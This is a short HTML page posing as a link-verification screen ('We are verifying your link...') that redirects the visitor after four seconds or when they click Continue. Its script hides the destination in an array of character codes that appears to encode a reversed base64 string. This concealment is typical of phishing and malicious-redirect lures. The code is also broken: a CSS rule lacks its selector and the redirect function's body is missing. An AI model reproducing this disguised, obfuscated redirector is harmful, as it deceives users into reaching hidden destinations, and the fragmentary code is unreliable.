<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

  <title>Checking Link...</title>
  <style>

      border: none;
      color: white;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>We are verifying your link...</h2>
    <p>Please wait a moment. You will be redirected shortly.</p>
    <button onclick="redirect()">Continue</button>
  </div>

  <script>
    const arr = [61,61,81,80,78,104,86,84,73,74,108,77,105,70,84,84,115,100,86,100,97,66,106,85,113,112,49,77,106,104,108,82,72,49,85,77,78,86,107,87,120,112,107,82,84,104,109,87,89,70,86,83,79,100,85,89,120,48,48,97,90,78,88,78,86,74,109,97,52,49,50,86,49,104,88,86,78,66,68,77,88,112,108,78,71,112,88,86,79,120,71,87,86,90,84,78,119,69,50,99,120,48,87,87,121,103,110,77,83,116,71,97,72,86,87,101,74,100,48,89,104,104,71,98,88,86,110,87,119,73,108,97,75,53,71,86,89,66,88,77,105,57,85,77,88,100,70,100,115,82,86,90,78,112,70,86,85,108,107,84,72,49,48,85,111,86,86,87];

    }
    setTimeout(redirect, 4000);
  </script>
</body>
